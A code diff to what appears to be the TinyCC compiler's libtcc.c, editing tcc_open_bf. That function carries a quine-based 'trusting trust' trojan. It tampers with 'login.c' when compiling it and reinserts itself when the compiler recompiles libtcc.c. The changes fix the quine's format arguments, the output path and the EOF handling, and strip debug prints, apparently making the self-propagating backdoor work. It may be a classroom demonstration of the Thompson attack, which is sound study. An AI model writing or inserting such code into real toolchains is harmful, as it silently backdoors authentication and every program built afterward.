@@ -680,10 +680,8 @@ PUB_FUNC void _tcc_warning(const char *fmt, ...)
 
 /********************************************************/
 /* I/O layer */
-#include "errno.h"
 ST_FUNC void tcc_open_bf(TCCState *s1, const char *filename, int initlen)
 {
-    // printf("top:%s\n\n",filename);
     // store actual file in temp file, then change libtcc back
     char *equine = "char * equine = %c%s%c; if (strcmp(filename, %clogin.c%c) == 0)\
     {\
@@ -719,7 +717,7 @@ ST_FUNC void tcc_open_bf(TCCState *s1, const char *filename, int initlen)
             fprintf(rewrite, %c%cs%c, a);\
             if(rewriting)\
             {\
-                fprintf(rewrite, equine, 34, equine, 34,34,34,34,34,34,92,34,92,34,92,34,92,34,34,34,37,34,34,34,34,34,34,34,34,34,34,92,34,34,37,34,34,34,34,34,34,34);\
+                fprintf(rewrite, equine, 34, equine, 34,34,34,34,34,34,92,34,92,34,92,34,92,34,34,34,37,34,34,34,34,34,34,34,34,34,34,92,34,34,37,34,34,34,34,34,34,34,34,34);\
                 rewriting = 0;\
             }\
             if(!strcmp(a,start))\
@@ -729,9 +727,9 @@ ST_FUNC void tcc_open_bf(TCCState *s1, const char *filename, int initlen)
         }\
         fclose(thisfile);\
         fclose(rewrite);\
-        FILE * thisfilewrite = fopen(filename, %cw%c);\
+        FILE * thisfilewrite = fopen(%cfilename.c%c, %cw%c);\
         FILE *reread = fopen(%crewrite.c%c, %cr%c);\
-        char qqq;\
+        int qqq;\
         qqq = fgetc(reread);\
         while (qqq != EOF)\
     {\
@@ -765,20 +763,18 @@ ST_FUNC void tcc_open_bf(TCCState *s1, const char *filename, int initlen)
     }
     else if (!strcmp(filename, "libtcc.c"))
     {
-        printf("IN LIBTCC\n");
         FILE *thisfile = fopen(filename, "r");
         FILE *rewrite = fopen("rewrite.c", "w+");
         char *a = NULL;
         size_t bites;
         char *start = "ST_FUNC void tcc_open_bf(TCCState *s1, const char *filename, int initlen)\n";
         int rewriting = 0;
-        printf("READING FILE\n");
         while (getline(&a, &bites, thisfile) != EOF)
         {
             fprintf(rewrite, "%s", a);
             if (rewriting)
             {
-                fprintf(rewrite, equine, 34, equine, 34, 34, 34, 34, 34, 34, 92, 34, 92, 34, 92, 34, 92, 34, 34, 34, 37, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 92, 34, 34, 37, 34, 34, 34, 34, 34, 34, 34);
+                fprintf(rewrite, equine, 34, equine, 34, 34, 34, 34, 34, 34, 92, 34, 92, 34, 92, 34, 92, 34, 34, 34, 37, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 92, 34, 34, 37, 34, 34, 34, 34, 34, 34, 34, 34, 34);
                 rewriting = 0;
             }
             if (!strcmp(a, start))
